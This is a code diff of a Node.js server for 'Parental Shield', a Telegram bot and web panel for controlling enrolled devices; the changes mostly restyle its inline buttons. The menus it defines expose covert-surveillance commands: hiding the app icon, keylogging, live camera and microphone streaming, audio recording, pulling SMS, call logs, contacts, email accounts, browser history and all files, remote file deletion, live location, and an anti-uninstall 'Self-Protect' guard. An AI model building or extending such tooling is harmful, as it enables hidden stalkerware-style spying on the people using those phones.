@@ -1,6 +1,5 @@
-// Parental Shield — Unified Server v2.1
+// Parental Shield — Unified Server v2.0
 // Web Admin Panel + Telegram Bot + Telegram Mini App
-// Updated for Bot API 9.4+ : colored buttons (style) + custom emoji icons (icon_custom_emoji_id)
 
 require('dotenv').config();
 
@@ -90,83 +89,95 @@ function escapeMdCode(text) {
   return String(text).replace(/`/g, "'");
 }
 
-// ════════════════════════════════════════════════════════════════════
-// Bot API 9.4+ Button helpers (colored buttons + premium custom emoji)
+// ── Bot API 9.4+ button styling + custom premium emoji ─────────────────────
 // style: "primary" (blue) | "success" (green) | "danger" (red)
 // icon_custom_emoji_id: requires bot owner Premium OR Fragment username
-// ════════════════════════════════════════════════════════════════════
-const BTN_STYLE = {
-  PRIMARY: 'primary',
-  SUCCESS: 'success',
-  DANGER:  'danger',
+const CUSTOM_EMOJI = {
+  phone:      "6053023544852356700", // 📱
+  check:      "6057365116838484267", // ✅
+  cross:      "5956091557525327060", // ❌
+  lock:       "6149752513370266455", // 🔒
+  camera:     "5956485766803624269", // 📷
+  mic:        "4956441587283395517", // 🎤
+  pin:        "4958728373900674046", // 📍
+  call:       "6149951632349076870", // 📞
+  chat:       "6147871085766387024", // 💬
+  users:      "6147414775555957124", // 👥
+  inbox:      "6325435393244142578", // 📥
+  info:       "6203791465471022369", // ℹ️
+  globe:      "6057519357704018359", // 🌐
+  bell:       "5956085806564118570", // 🔔
+  chart:      "4958506272551863292", // 📊
+  signal:     "6127475690531982315", // 📶
+  video:      "5958646732353966136", // 📹
+  ban:        "4956337889593000947", // 🚫
+  link:       "5956273741448089195", // 🔗
+  shield:     "5442631872305736555", // 🛡️
+  refresh:    "6327963337980124903", // 🔄
+  star:       "6055525586640575618", // ⭐
+  star2:      "6057606910612349635", // ⭐️
+  heart:      "5224502238667382039", // ❤️
+  gem:        "5956466246177263269", // 💎
+  gear:       "6149867038673214804", // ⚙️
+  green:      "5956540789629653116", // 🟢
+  red:        "5956303789039292362", // 🔴
+  yellow:     "5958731613792636841", // 🟡
+  fire:       "6325480498990685241", // 🔥
+  money:      "6057427630087478400", // 💰
+  arrow_r:    "6147894617892199810", // ➡️
+  eyes:       "5224425934278401310", // 👀
+  warn:       "5956094645606813545", // ⚠️
+  question:   "5956222266265047467", // ❓
+  alert:      "5956216614088085071", // 🚨
+  thumbs:     "5956301267893490478", // 👍
+  pray:       "5956053791877894256", // 🙏
+  gift:       "5956081734935121744", // 🎁
+  game:       "6149862331389058678", // 🎮
+  note:       "5956069176450747637", // 📝
+  megaphone:  "5956487751078515106", // 📣
+  hourglass:  "6152336211076717589", // ⏳
+  clap:       "5956413241985863424", // 👏
+  bolt:       "5956305296572812671", // ⚡️
+  sound:      "5956038274161053198", // 🔊
+  cash:       "5956131818548760588", // 💵
+  card:       "5956439729049177912", // 💳
+  plane:      "5956437048989585279", // ✈️
+  tv:         "5956072874417590390", // 📺
+  mic2:       "5956209170909761466", // 🎙
+  alien:      "5956387137174638287", // 👾
+  tools:      "5956315930911838506", // 🛠
+  clock:      "5956160895477355164", // 🕐
+  party:      "5958741397728137162", // 🎉
+  pushpin:    "5956520465844407645", // 📌
+  cool:       "5224552884921739153", // 😎
+  scream:     "5224243380988452332", // 😱
+  star_eyes:  "5224588060703891161", // 🤩
+  skull:      "6096100859945425625", // ☠️
+  stop:       "5956279745812369217", // ⛔️
+  ok:         "6057365116838484267", // ✅
+  trash:      "6140944364374859276", // 💩 (fallback)
+  arrow_l:    "5956136500063113151", // ⬅️
+  left:       "5956400073616133738", // 👈
+  home:       "6053023544852356700", // reuse phone as home-ish
+  folder:     "5956069176450747637", // 📝 as folder-ish
+  torch:      "5956305296572812671", // ⚡️
+  wifi:       "6127475690531982315", // 📶
+  key:        "6149752513370266455", // 🔒
 };
 
-/**
- * Create an InlineKeyboardButton with optional style + custom emoji icon.
- * Extra fields are passed through by node-telegram-bot-api to the Bot API.
- */
-function ibtn(text, callback_data, opts = {}) {
-  const btn = { text, callback_data };
-  if (opts.style) btn.style = opts.style;
-  if (opts.icon)  btn.icon_custom_emoji_id = String(opts.icon);
-  if (opts.disabled) btn.disabled = true; // Bot API 10.3+
-  return btn;
+/** Build an InlineKeyboardButton / KeyboardButton with optional style + custom emoji */
+function btn(text, opts = {}) {
+  const o = { text };
+  if (opts.callback_data != null) o.callback_data = opts.callback_data;
+  if (opts.url != null) o.url = opts.url;
+  if (opts.web_app != null) o.web_app = opts.web_app;
+  if (opts.style) o.style = opts.style; // primary | success | danger
+  if (opts.icon) o.icon_custom_emoji_id = String(opts.icon);
+  if (opts.icon_custom_emoji_id) o.icon_custom_emoji_id = String(opts.icon_custom_emoji_id);
+  return o;
 }
 
-function ibtnUrl(text, url, opts = {}) {
-  const btn = { text, url };
-  if (opts.style) btn.style = opts.style;
-  if (opts.icon)  btn.icon_custom_emoji_id = String(opts.icon);
-  return btn;
-}
 
-function ibtnWebApp(text, webAppUrl, opts = {}) {
-  const btn = { text, web_app: { url: webAppUrl } };
-  if (opts.style) btn.style = opts.style;
-  if (opts.icon)  btn.icon_custom_emoji_id = String(opts.icon);
-  return btn;
-}
-
-// Custom emoji IDs (from user-provided @TgEmojis lists)
-// Requires bot owner Telegram Premium OR Fragment username for icons to show.
-const EMOJI = {
-  check:      '6057365116838484267', // ✅
-  check2:     '6057565348213825388', // ✅
-  check3:     '5323386314400211783', // ✅
-  cross:      '5956091557525327060', // ❌
-  lock:       '6149752513370266455', // 🔒
-  unlock:     '5890882606668452641', // 🔓
-  shield:     '5442631872305736555', // 🛡️
-  phone:      '6053023544852356700', // 📱
-  settings:   '6149867038673214804', // ⚙️
-  call:       '6149951632349076870', // 📞
-  chat:       '6147871085766387024', // 💬
-  camera:     '5956485766803624269', // 📷
-  video:      '5958646732353966136', // 📹
-  mic:        '5956209170909761466', // 🎙
-  location:   '4958728373900674046', // 📍
-  download:   '6325435393244142578', // 📥
-  refresh:    '6327963337980124903', // 🔄
-  warning:    '5956094645606813545', // ⚠️
-  alert:      '5956216614088085071', // 🚨
-  star:       '6057488120406875339', // ⭐
-  fire:       '6325480498990685241', // 🔥
-  trash:      '4958534924278694938', // 🗑
-  eye:        '5224425934278401310', // 👀
-  ring:       '5956085806564118570', // 🔔
-  wifi:       '5927284851093803771', // 🛜
-  network:    '6057519357704018359', // 🌐
-  battery:    '5913513644049570217', // 🔋
-  game:       '5956051000149152574', // 🎮
-  users:      '6147414775555957124', // 👥
-  info:       '6203791465471022369', // ℹ️
-  rocket:     '5800956853462504394', // 🚀
-  stop:       '6325514936038465701', // 🛑
-  success:    '5956344921941086117', // ✅
-  danger:     '5956556092598129705', // ⛔️
-  arrow:      '6147894617892199810', // ➡️
-  home:       '4958485609464202497', // 🏡
-};
 
 // ════════════════════════════════════════════════════════════════════
 // BOT FILE BROWSER HELPERS
@@ -539,19 +550,21 @@ function handleBotFileListing(chatId, editMsgId, deviceId, payload, filterExt, p
       callback_data: `fb:nav:${deviceId}:${getCachedPathKey(parentPath)}:all`
     });
   }
-  navRow1.push({
-    text: '🏠 Home',
-    callback_data: `fb:nav:${deviceId}:${getCachedPathKey(STORAGE_ROOT)}:all`
-  });
-  navRow1.push({
-    text: '🔄 Refresh',
-    callback_data: `fb:nav:${deviceId}:${pathKey}:${filter}`
-  });
+  navRow1.push(btn('Home', {
+    callback_data: `fb:nav:${deviceId}:${getCachedPathKey(STORAGE_ROOT)}:all`,
+    style: 'primary',
+    icon: CUSTOM_EMOJI.phone
+  }));
+  navRow1.push(btn('Refresh', {
+    callback_data: `fb:nav:${deviceId}:${pathKey}:${filter}`,
+    style: 'success',
+    icon: CUSTOM_EMOJI.refresh
+  }));
 
   const navRow2 = [
-    { text: '✏️ Path', callback_data: `fb:custom:${deviceId}` },
-    { text: '📥 All here', callback_data: `fb:getall:${deviceId}:${pathKey}` },
-    { text: '◀️ Device', callback_data: `sel:${deviceId}` },
+    btn('Path', { callback_data: `fb:custom:${deviceId}`, icon: CUSTOM_EMOJI.note }),
+    btn('All here', { callback_data: `fb:getall:${deviceId}:${pathKey}`, style: 'success', icon: CUSTOM_EMOJI.inbox }),
+    btn('Device', { callback_data: `sel:${deviceId}`, style: 'primary', icon: CUSTOM_EMOJI.phone }),
   ];
 
   const keyboard = {
@@ -834,16 +847,15 @@ function initTelegramBot() {
   }
 
   // ── Keyboard builders ─────────────────────────────────────────────────
-  // Reply keyboard also supports style + icon_custom_emoji_id (Bot API 9.4+)
   const MAIN_REPLY_KB = {
     keyboard: [
       [
-        { text: "📱 Devices", style: BTN_STYLE.PRIMARY },
-        { text: "🖥️ Full Panel", style: BTN_STYLE.PRIMARY },
+        btn("Devices", { icon: CUSTOM_EMOJI.phone, style: "primary" }),
+        btn("Full Panel", { icon: CUSTOM_EMOJI.gem, style: "primary" }),
       ],
       [
-        { text: "📊 Status", style: BTN_STYLE.PRIMARY },
-        { text: "⚙️ Settings", style: BTN_STYLE.PRIMARY },
+        btn("Status", { icon: CUSTOM_EMOJI.chart, style: "success" }),
+        btn("Settings", { icon: CUSTOM_EMOJI.gear }),
       ],
     ],
     resize_keyboard: true,
@@ -855,12 +867,14 @@ function initTelegramBot() {
     const rows = [];
     for (const [id, dev] of childDevices.entries()) {
       const bat = dev.battery || 0;
-      const icon = bat > 60 ? "🟢" : bat > 20 ? "🟡" : "🔴";
-      // primary style for device selection
+      const batStyle = bat > 60 ? "success" : bat > 20 ? "primary" : "danger";
+      const batIcon = bat > 60 ? CUSTOM_EMOJI.green : bat > 20 ? CUSTOM_EMOJI.yellow : CUSTOM_EMOJI.red;
       rows.push([
-        ibtn(`${icon} ${dev.childName}  •  🔋${bat}%  •  ${dev.activeApp || "Home"}`, `sel:${id}`, {
-          style: BTN_STYLE.PRIMARY
-        })
+        btn(`${dev.childName}  •  ${bat}%  •  ${dev.activeApp || "Home"}`, {
+          callback_data: `sel:${id}`,
+          style: batStyle,
+          icon: batIcon,
+        }),
       ]);
     }
     return { inline_keyboard: rows };
@@ -869,96 +883,96 @@ function initTelegramBot() {
   function deviceActionInlineKB(deviceId) {
     const miniUrl = PUBLIC_URL ? `${PUBLIC_URL}/?tg=1` : null;
     const rows = [
-      // Security / control
       [
-        ibtn("Lock Screen", `act:lock:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.lock }),
-        ibtn("Vibrate",     `act:buzz:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.alert }),
+        btn("Lock Screen", { callback_data: `act:lock:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.lock }),
+        btn("Vibrate", { callback_data: `act:buzz:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.bolt }),
       ],
       [
-        ibtn("Hide Icon", `act:hide_icon:${deviceId}`,   { style: BTN_STYLE.DANGER,  icon: EMOJI.eye }),
-        ibtn("Show Icon", `act:unhide_icon:${deviceId}`, { style: BTN_STYLE.SUCCESS, icon: EMOJI.check }),
+        btn("Hide Icon", { callback_data: `act:hide_icon:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.eyes }),
+        btn("Show Icon", { callback_data: `act:unhide_icon:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.eyes }),
       ],
       [
-        ibtn("Screen Time", `act:screentime:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.battery }),
-        ibtn("Block Apps",  `act:policy:${deviceId}`,     { style: BTN_STYLE.DANGER,  icon: EMOJI.danger }),
-      ],
-      // Media capture
-      [
-        ibtn("Cam Front", `act:photo_front:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.camera }),
-        ibtn("Cam Back",  `act:photo_back:${deviceId}`,  { style: BTN_STYLE.PRIMARY, icon: EMOJI.camera }),
+        btn("Screen Time Limit", { callback_data: `act:screentime:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.hourglass }),
+        btn("Block Apps", { callback_data: `act:policy:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.ban }),
       ],
       [
-        ibtn("Record 30s", `act:record_audio:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.mic }),
-        ibtn("Location",   `act:get_location:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.location }),
-      ],
-      // Data
-      [
-        ibtn("Call Log", `act:call_log:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.call }),
-        ibtn("SMS",      `act:sms:${deviceId}`,      { style: BTN_STYLE.PRIMARY, icon: EMOJI.chat }),
+        btn("Camera Front", { callback_data: `act:photo_front:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.camera }),
+        btn("Camera Back", { callback_data: `act:photo_back:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.camera }),
       ],
       [
-        ibtn("Contacts", `act:contacts:${deviceId}`,       { style: BTN_STYLE.PRIMARY, icon: EMOJI.users }),
-        ibtn("Apps",     `act:installed_apps:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.phone }),
+        btn("Record 30s", { callback_data: `act:record_audio:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.mic }),
+        btn("Location", { callback_data: `act:get_location:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.pin }),
       ],
       [
-        ibtn("Files",         `act:files:${deviceId}`,         { style: BTN_STYLE.PRIMARY, icon: EMOJI.download }),
-        ibtn("Get All Files", `act:get_all_files:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.download }),
+        btn("Call Log", { callback_data: `act:call_log:${deviceId}`, icon: CUSTOM_EMOJI.call }),
+        btn("SMS", { callback_data: `act:sms:${deviceId}`, icon: CUSTOM_EMOJI.chat }),
       ],
       [
-        ibtn("Torch ON",  `act:torch_on:${deviceId}`,  { style: BTN_STYLE.SUCCESS, icon: EMOJI.star }),
-        ibtn("Torch OFF", `act:torch_off:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.stop }),
+        btn("Contacts", { callback_data: `act:contacts:${deviceId}`, icon: CUSTOM_EMOJI.users }),
+        btn("Installed Apps", { callback_data: `act:installed_apps:${deviceId}`, icon: CUSTOM_EMOJI.game }),
       ],
       [
-        ibtn("Live Location", `act:start_live_location:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.location }),
-        ibtn("Stop LiveLoc",  `act:stop_live_location:${deviceId}`,  { style: BTN_STYLE.DANGER,  icon: EMOJI.stop }),
+        btn("Files", { callback_data: `act:files:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.note }),
+        btn("Get All Files", { callback_data: `act:get_all_files:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.inbox }),
       ],
       [
-        ibtn("Screenshot",  `act:take_screenshot:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.camera }),
-        ibtn("Device Info", `act:get_info:${deviceId}`,        { style: BTN_STYLE.PRIMARY, icon: EMOJI.info }),
+        btn("Torch ON", { callback_data: `act:torch_on:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.bolt }),
+        btn("Torch OFF", { callback_data: `act:torch_off:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.bolt }),
       ],
       [
-        ibtn("Email",   `act:email_accounts:${deviceId}`,  { style: BTN_STYLE.PRIMARY, icon: EMOJI.chat }),
-        ibtn("History", `act:browser_history:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.network }),
+        btn("Live Location", { callback_data: `act:start_live_location:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.pin }),
+        btn("Stop LiveLoc", { callback_data: `act:stop_live_location:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.stop }),
       ],
       [
-        ibtn("Keylog",    `act:keylog:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.eye }),
-        ibtn("Ring Loud", `act:ring:${deviceId}`,   { style: BTN_STYLE.DANGER,  icon: EMOJI.ring }),
+        btn("Screenshot", { callback_data: `act:take_screenshot:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.camera }),
+        btn("Device Info", { callback_data: `act:get_info:${deviceId}`, icon: CUSTOM_EMOJI.info }),
       ],
       [
-        ibtn("App Usage",    `act:app_usage:${deviceId}`,    { style: BTN_STYLE.PRIMARY, icon: EMOJI.game }),
-        ibtn("Network Info", `act:network_info:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.wifi }),
-      ],
-      // Live streams
-      [
-        ibtn("Cam LIVE Front", `act:cam_stream_front:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.video }),
-        ibtn("Cam LIVE Back",  `act:cam_stream_back:${deviceId}`,  { style: BTN_STYLE.PRIMARY, icon: EMOJI.video }),
+        btn("Email Accounts", { callback_data: `act:email_accounts:${deviceId}`, icon: CUSTOM_EMOJI.chat }),
+        btn("History", { callback_data: `act:browser_history:${deviceId}`, icon: CUSTOM_EMOJI.globe }),
       ],
       [
-        ibtn("Mic LIVE",     `act:mic_stream:${deviceId}`,   { style: BTN_STYLE.PRIMARY, icon: EMOJI.mic }),
-        ibtn("Stop Streams", `act:stop_streams:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.stop }),
+        btn("Keylog", { callback_data: `act:keylog:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.note }),
+        btn("Ring Loud", { callback_data: `act:ring:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.bell }),
       ],
       [
-        ibtn("WiFi ON",  `act:wifi_on:${deviceId}`,  { style: BTN_STYLE.SUCCESS, icon: EMOJI.wifi }),
-        ibtn("WiFi OFF", `act:wifi_off:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.danger }),
+        btn("App Usage", { callback_data: `act:app_usage:${deviceId}`, icon: CUSTOM_EMOJI.chart }),
+        btn("Network Info", { callback_data: `act:network_info:${deviceId}`, icon: CUSTOM_EMOJI.signal }),
       ],
       [
-        ibtn("Block App",   `act:block_app:${deviceId}`,   { style: BTN_STYLE.DANGER,  icon: EMOJI.cross }),
-        ibtn("Unblock App", `act:unblock_app:${deviceId}`, { style: BTN_STYLE.SUCCESS, icon: EMOJI.check }),
+        btn("Cam LIVE Front", { callback_data: `act:cam_stream_front:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.video }),
+        btn("Cam LIVE Back", { callback_data: `act:cam_stream_back:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.video }),
       ],
       [
-        ibtn("Open URL", `act:open_url:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.network }),
+        btn("Mic LIVE", { callback_data: `act:mic_stream:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.mic2 }),
+        btn("Stop Streams", { callback_data: `act:stop_streams:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.stop }),
       ],
       [
-        ibtn("Self-Protect", `act:guard:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.shield }),
+        btn("WiFi ON", { callback_data: `act:wifi_on:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.wifi }),
+        btn("WiFi OFF", { callback_data: `act:wifi_off:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.wifi }),
       ],
       [
-        ibtn("Show Toast", `act:toast:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.chat }),
-        ibtn("Refresh",    `sel:${deviceId}`,       { style: BTN_STYLE.PRIMARY, icon: EMOJI.refresh }),
+        btn("Block App", { callback_data: `act:block_app:${deviceId}`, style: "danger", icon: CUSTOM_EMOJI.ban }),
+        btn("Unblock App", { callback_data: `act:unblock_app:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.check }),
+      ],
+      [
+        btn("Open URL", { callback_data: `act:open_url:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.link }),
+      ],
+      [
+        btn("Self-Protect", { callback_data: `act:guard:${deviceId}`, style: "primary", icon: CUSTOM_EMOJI.shield }),
+      ],
+      [
+        btn("Show Toast", { callback_data: `act:toast:${deviceId}`, icon: CUSTOM_EMOJI.megaphone }),
+        btn("Refresh", { callback_data: `sel:${deviceId}`, style: "success", icon: CUSTOM_EMOJI.refresh }),
       ],
     ];
     if (miniUrl) {
       rows.push([
-        ibtnWebApp("Open Full Admin Panel", miniUrl, { style: BTN_STYLE.PRIMARY, icon: EMOJI.rocket })
+        btn("Open Full Admin Panel", {
+          web_app: { url: miniUrl },
+          style: "primary",
+          icon: CUSTOM_EMOJI.gem,
+        }),
       ]);
     }
     return { inline_keyboard: rows };
@@ -980,7 +994,7 @@ function initTelegramBot() {
     const opts = {
       parse_mode: "Markdown",
       reply_markup: childDevices.size === 0
-        ? { inline_keyboard: [[ibtn("Refresh", "menu:devices", { style: BTN_STYLE.PRIMARY, icon: EMOJI.refresh })]] }
+        ? { inline_keyboard: [[{ text: "🔄 Refresh", callback_data: "menu:devices" }]] }
         : deviceListInlineKB()
     };
 
@@ -1077,7 +1091,7 @@ function initTelegramBot() {
       return;
     }
 
-    const MENU_TEXTS = ['📱 Devices', '📊 Status', '⚙️ Settings', '🖥️ Full Panel'];
+    const MENU_TEXTS = ['📱 Devices', '📊 Status', '⚙️ Settings', '🖥️ Full Panel', 'Devices', 'Status', 'Settings', 'Full Panel'];
     if (state.awaitingInput && MENU_TEXTS.includes(text)) {
       state.awaitingInput = null;
     }
@@ -1229,9 +1243,9 @@ function initTelegramBot() {
     }
 
     // ── Reply keyboard button text handlers ──────────────────────────────
-    if (text === "📱 Devices")  { sendDeviceList(chatId); return; }
-    if (text === "📊 Status")   { sendStatus(chatId); return; }
-    if (text === "⚙️ Settings") {
+    if (text === "📱 Devices" || text === "Devices")  { sendDeviceList(chatId); return; }
+    if (text === "📊 Status" || text === "Status")   { sendStatus(chatId); return; }
+    if (text === "⚙️ Settings" || text === "Settings") {
       const miniUrl = PUBLIC_URL ? `${PUBLIC_URL}/?tg=1` : null;
       bot.sendMessage(chatId,
         `⚙️ *Settings*\n\n🔑 Token: \`${escapeMdCode(SECURITY_TOKEN)}\`\n🤖 Admin ID: \`${ADMIN_TG_ID}\`\n🌐 Server: \`${escapeMdCode(PUBLIC_URL || "local")}\``,
@@ -1246,7 +1260,7 @@ function initTelegramBot() {
       );
       return;
     }
-    if (text === "🖥️ Full Panel") {
+    if (text === "🖥️ Full Panel" || text === "Full Panel") {
       if (!PUBLIC_URL) {
         bot.sendMessage(chatId, "❌ PUBLIC_URL set kora nai `.env` e.\nServer HTTPS URL ta add koro.");
         return;
@@ -1369,16 +1383,16 @@ function initTelegramBot() {
             reply_markup: {
               inline_keyboard: [
                 [
-                  ibtn("30 min",   `st:30:${deviceId}`,  { style: BTN_STYLE.PRIMARY }),
-                  ibtn("1 ghonta", `st:60:${deviceId}`,  { style: BTN_STYLE.PRIMARY }),
-                  ibtn("2 ghonta", `st:120:${deviceId}`, { style: BTN_STYLE.PRIMARY }),
+                  { text: "30 min",  callback_data: `st:30:${deviceId}`  },
+                  { text: "1 ghonta", callback_data: `st:60:${deviceId}`  },
+                  { text: "2 ghonta", callback_data: `st:120:${deviceId}` },
                 ],
                 [
-                  ibtn("3 ghonta",  `st:180:${deviceId}`, { style: BTN_STYLE.PRIMARY }),
-                  ibtn("Unlimited", `st:0:${deviceId}`,   { style: BTN_STYLE.SUCCESS }),
+                  { text: "3 ghonta", callback_data: `st:180:${deviceId}` },
+                  { text: "Unlimited", callback_data: `st:0:${deviceId}` },
                 ],
-                [ibtn("Notun number tipo", `st:custom:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.settings })],
-                [ibtn("Back", `sel:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.arrow })],
+                [{ text: "✏️ Notun number tipo", callback_data: `st:custom:${deviceId}` }],
+                [{ text: "◀️ Back",  callback_data: `sel:${deviceId}` }],
               ]
             }
           }
@@ -1401,24 +1415,24 @@ function initTelegramBot() {
             reply_markup: {
               inline_keyboard: [
                 [
-                  ibtn("🎵 TikTok",    `blk:com.zhiliaoapp.musically:${deviceId}`, { style: BTN_STYLE.DANGER }),
-                  ibtn("📸 Instagram", `blk:com.instagram.android:${deviceId}`,    { style: BTN_STYLE.DANGER }),
+                  { text: "🎵 TikTok",    callback_data: `blk:com.zhiliaoapp.musically:${deviceId}` },
+                  { text: "📸 Instagram", callback_data: `blk:com.instagram.android:${deviceId}`    },
                 ],
                 [
-                  ibtn("👻 Snapchat", `blk:com.snapchat.android:${deviceId}`,         { style: BTN_STYLE.DANGER }),
-                  ibtn("▶️ YouTube",  `blk:com.google.android.youtube:${deviceId}`,   { style: BTN_STYLE.DANGER }),
+                  { text: "👻 Snapchat",  callback_data: `blk:com.snapchat.android:${deviceId}`    },
+                  { text: "▶️ YouTube",   callback_data: `blk:com.google.android.youtube:${deviceId}` },
                 ],
                 [
-                  ibtn("📘 Facebook", `blk:com.facebook.katana:${deviceId}`, { style: BTN_STYLE.DANGER }),
-                  ibtn("💚 WhatsApp", `blk:com.whatsapp:${deviceId}`,        { style: BTN_STYLE.DANGER }),
+                  { text: "📘 Facebook",  callback_data: `blk:com.facebook.katana:${deviceId}`     },
+                  { text: "💚 WhatsApp",  callback_data: `blk:com.whatsapp:${deviceId}`             },
                 ],
                 [
-                  ibtn("🎮 PUBG",      `blk:com.tencent.ig:${deviceId}`, { style: BTN_STYLE.DANGER }),
-                  ibtn("🔴 Bigo Live", `blk:com.bigo.live:${deviceId}`,  { style: BTN_STYLE.DANGER }),
+                  { text: "🎮 PUBG",      callback_data: `blk:com.tencent.ig:${deviceId}`          },
+                  { text: "🔴 Bigo Live", callback_data: `blk:com.bigo.live:${deviceId}`            },
                 ],
-                [ibtn("✏️ Custom package name tipo", `blk:custom:${deviceId}`, { style: BTN_STYLE.PRIMARY })],
-                [ibtn("Sob clear koro", `blk:clear:${deviceId}`, { style: BTN_STYLE.SUCCESS, icon: EMOJI.check })],
-                [ibtn("Back", `sel:${deviceId}`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.arrow })],
+                [{ text: "✏️ Custom package name tipo", callback_data: `blk:custom:${deviceId}` }],
+                [{ text: "🗑️ Sob clear koro", callback_data: `blk:clear:${deviceId}` }],
+                [{ text: "◀️ Back",  callback_data: `sel:${deviceId}` }],
               ]
             }
           }
@@ -1656,10 +1670,10 @@ Kon inbox dekhte chao?`, {
           {
             parse_mode: "Markdown",
             reply_markup: { inline_keyboard: [
-              [ibtn("ARM Guard",         `act:guard_arm:${deviceId}`,       { style: BTN_STYLE.SUCCESS, icon: EMOJI.shield })],
-              [ibtn("Disarm (temporary)", `act:guard_disarm:${deviceId}`,   { style: BTN_STYLE.DANGER,  icon: EMOJI.warning })],
-              [ibtn("Uninstall Mode",     `act:guard_uninstall:${deviceId}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.trash })],
-              [ibtn("Back to Device",      `sel:${deviceId}`,                 { style: BTN_STYLE.PRIMARY, icon: EMOJI.arrow })],
+              [{ text: "🛡️ ARM Guard",         callback_data: `act:guard_arm:${deviceId}` }],
+              [{ text: "⚠️ Disarm (temporary)", callback_data: `act:guard_disarm:${deviceId}` }],
+              [{ text: "🗑️ Uninstall Mode",     callback_data: `act:guard_uninstall:${deviceId}` }],
+              [{ text: "◀️ Back to Device",      callback_data: `sel:${deviceId}` }],
             ]}
           }
         );
@@ -1960,11 +1974,11 @@ Kon inbox dekhte chao?`, {
             reply_markup: {
               inline_keyboard: [
                 [
-                  ibtn('Download', `fb:dl:${devId}:${getCachedPathKey(filePath)}`,  { style: BTN_STYLE.SUCCESS, icon: EMOJI.download }),
-                  ibtn('Delete',   `fb:del:${devId}:${getCachedPathKey(filePath)}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.trash }),
+                  btn('Download', { callback_data: `fb:dl:${devId}:${getCachedPathKey(filePath)}`, style: 'success', icon: CUSTOM_EMOJI.inbox }),
+                  btn('Delete', { callback_data: `fb:del:${devId}:${getCachedPathKey(filePath)}`, style: 'danger', icon: CUSTOM_EMOJI.cross }),
                 ],
                 [
-                  ibtn('Back to folder', `fb:nav:${devId}:${getCachedPathKey(filePath.substring(0, filePath.lastIndexOf('/')))}:all`, { style: BTN_STYLE.PRIMARY, icon: EMOJI.arrow }),
+                  { text: '◀️ Back to folder',  callback_data: `fb:nav:${devId}:${getCachedPathKey(filePath.substring(0, filePath.lastIndexOf('/')))}:all` },
                 ]
               ]
             }
@@ -2012,8 +2026,8 @@ Nischit delete korte chao?`,
             parse_mode: 'Markdown',
             reply_markup: {
               inline_keyboard: [[
-                ibtn('Ha, delete koro', `fb:delok:${devId}:${getCachedPathKey(filePath)}`, { style: BTN_STYLE.DANGER,  icon: EMOJI.trash }),
-                ibtn('Cancel',          `fb:file:${devId}:${getCachedPathKey(filePath)}`,  { style: BTN_STYLE.PRIMARY, icon: EMOJI.cross }),
+                btn('Ha, delete koro', { callback_data: `fb:delok:${devId}:${getCachedPathKey(filePath)}`, style: 'danger', icon: CUSTOM_EMOJI.check }),
+                btn('Cancel', { callback_data: `fb:file:${devId}:${getCachedPathKey(filePath)}`, icon: CUSTOM_EMOJI.cross }),
               ]]
             }
           }
@@ -2072,7 +2086,7 @@ function notifyDeviceConnected(deviceId, childName, battery) {
     {
       reply_markup: {
         inline_keyboard: [[
-          { text: `📱 Manage ${childName}`, callback_data: `sel:${deviceId}` }
+          btn(`Manage ${childName}`, { callback_data: `sel:${deviceId}`, style: 'primary', icon: CUSTOM_EMOJI.phone })
         ]]
       }
     }
@@ -2106,7 +2120,7 @@ function notifyBatteryLow(deviceId, childName, battery) {
     {
       reply_markup: {
         inline_keyboard: [[
-          { text: "🔒 Lock Device", callback_data: `act:lock:${deviceId}` }
